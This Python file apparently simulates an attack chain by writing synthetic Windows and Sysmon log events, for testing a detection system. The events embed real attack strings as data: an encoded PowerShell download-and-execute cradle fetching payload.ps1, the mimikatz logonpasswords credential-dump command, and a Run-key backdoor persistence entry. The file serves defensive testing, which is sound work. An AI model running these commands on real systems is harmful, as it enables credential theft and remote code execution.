# ============================================================
#   simulations/attack_simulator.py — Simulate attack logs
# ============================================================

import json
import os
import random
import time
from datetime import datetime, timedelta
import config

os.makedirs(config.LOG_DIR, exist_ok=True)


def _now(offset_sec=0) -> str:
    return (datetime.utcnow() + timedelta(seconds=offset_sec)).isoformat()


# ── Scenario builders ────────────────────────────────────

def scenario_brute_force(username="jdoe", count=8, host="WORKSTATION-01"):
    events = []
    for i in range(count):
        events.append({
            "EventID"       : "4625",
            "TimeCreated"   : _now(-count + i),
            "Computer"      : host,
            "TargetUserName": username,
            "IpAddress"     : f"192.168.1.{random.randint(100,120)}",
            "LogonType"     : "3",
            "SubStatus"     : "0xC000006A",
        })
    return events


def scenario_login_after_failures(username="jdoe", failures=5, host="WORKSTATION-01"):
    events = scenario_brute_force(username, failures, host)
    # Final successful login
    events.append({
        "EventID"       : "4624",
        "TimeCreated"   : _now(5),
        "Computer"      : host,
        "TargetUserName": username,
        "IpAddress"     : "192.168.1.110",
        "LogonType"     : "3",
    })
    return events


def scenario_privilege_escalation(username="jdoe", host="WORKSTATION-01"):
    return [{
        "EventID"       : "4672",
        "TimeCreated"   : _now(),
        "Computer"      : host,
        "SubjectUserName": username,
        "PrivilegeList" : "SeDebugPrivilege\nSeTcbPrivilege\nSeImpersonatePrivilege",
    }]


def scenario_suspicious_powershell(host="WORKSTATION-01", user="jdoe"):
    return [{
        "EventID"    : "1",
        "TimeCreated": _now(),
        "Computer"   : host,
        "User"       : user,
        "Image"      : "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "ProcessId"  : str(random.randint(1000, 9000)),
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
    }]


def scenario_mimikatz(host="WORKSTATION-01", user="jdoe"):
    return [{
        "EventID"    : "1",
        "TimeCreated": _now(),
        "Computer"   : host,
        "User"       : user,
        "Image"      : "C:\\Temp\\mimikatz.exe",
        "ProcessId"  : str(random.randint(1000, 9000)),
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "CommandLine": "mimikatz.exe sekurlsa::logonpasswords exit",
    }]


def scenario_c2_connection(host="WORKSTATION-01", user="jdoe"):
    return [{
        "EventID"           : "3",
        "TimeCreated"       : _now(),
        "Computer"          : host,
        "User"              : user,
        "Image"             : "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "ProcessId"         : str(random.randint(1000, 9000)),
        "SourceIp"          : "192.168.1.50",
        "SourcePort"        : str(random.randint(49152, 65535)),
        "DestinationIp"     : random.choice(config.KNOWN_BAD_IPS),
        "DestinationPort"   : "4444",
    }]


def scenario_persistence(host="WORKSTATION-01", user="jdoe"):
    return [{
        "EventID"     : "13",
        "TimeCreated" : _now(),
        "Computer"    : host,
        "User"        : user,
        "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
        "Details"     : "C:\\Users\\Public\\backdoor.exe",
    }]


def scenario_lateral_movement(host="WORKSTATION-01", user="jdoe"):
    return [{
        "EventID"         : "3",
        "TimeCreated"     : _now(),
        "Computer"        : host,
        "User"            : user,
        "Image"           : "C:\\Windows\\System32\\wmic.exe",
        "ProcessId"       : str(random.randint(1000, 9000)),
        "SourceIp"        : "192.168.1.50",
        "DestinationIp"   : "192.168.1.200",
        "DestinationPort" : "135",
    }]


# ── Compose full attack chain ─────────────────────────────

ALL_SCENARIOS = {
    "brute_force"          : scenario_brute_force,
    "login_after_failures" : scenario_login_after_failures,
    "privilege_escalation" : scenario_privilege_escalation,
    "suspicious_powershell": scenario_suspicious_powershell,
    "mimikatz"             : scenario_mimikatz,
    "c2_connection"        : scenario_c2_connection,
    "persistence"          : scenario_persistence,
    "lateral_movement"     : scenario_lateral_movement,
}


def run_scenario(name: str, **kwargs) -> list:
    fn = ALL_SCENARIOS.get(name)
    if not fn:
        raise ValueError(f"Unknown scenario: {name}")
    return fn(**kwargs)


def run_full_attack_chain(host="WORKSTATION-01", user="attacker"):
    """
    APT-style kill chain: recon → brute → priv esc → persist → cred dump → C2 → lateral
    """
    print(f"\n[SIM] Starting full attack chain on {host} as {user}")
    sysmon_events:  list = []
    winevent_events: list = []

    # Phase 1 – Brute Force
    print("[SIM] Phase 1: Brute Force")
    winevent_events += scenario_login_after_failures(user, 7, host)
    time.sleep(0.1)

    # Phase 2 – Privilege Escalation
    print("[SIM] Phase 2: Privilege Escalation")
    winevent_events += scenario_privilege_escalation(user, host)
    time.sleep(0.1)

    # Phase 3 – Suspicious PowerShell
    print("[SIM] Phase 3: Suspicious PowerShell")
    sysmon_events += scenario_suspicious_powershell(host, user)
    time.sleep(0.1)

    # Phase 4 – Persistence
    print("[SIM] Phase 4: Registry Persistence")
    sysmon_events += scenario_persistence(host, user)
    time.sleep(0.1)

    # Phase 5 – Credential Dump
    print("[SIM] Phase 5: Credential Dumping")
    sysmon_events += scenario_mimikatz(host, user)
    time.sleep(0.1)

    # Phase 6 – C2
    print("[SIM] Phase 6: C2 Beacon")
    sysmon_events += scenario_c2_connection(host, user)
    time.sleep(0.1)

    # Phase 7 – Lateral Movement
    print("[SIM] Phase 7: Lateral Movement")
    sysmon_events += scenario_lateral_movement(host, user)

    # Persist logs
    _append_events(config.SYSMON_LOG, sysmon_events)
    _append_events(config.WINEVENT_LOG, winevent_events)
    print(f"\n[SIM] ✅ Attack chain complete. {len(sysmon_events)} Sysmon + {len(winevent_events)} WinEvent logs written.")


def _append_events(path: str, new_events: list):
    existing = []
    if os.path.exists(path):
        with open(path, "r") as f:
            try:
                existing = json.load(f)
            except Exception:
                existing = []
    existing.extend(new_events)
    with open(path, "w") as f:
        json.dump(existing, f, indent=2)


if __name__ == "__main__":
    run_full_attack_chain()
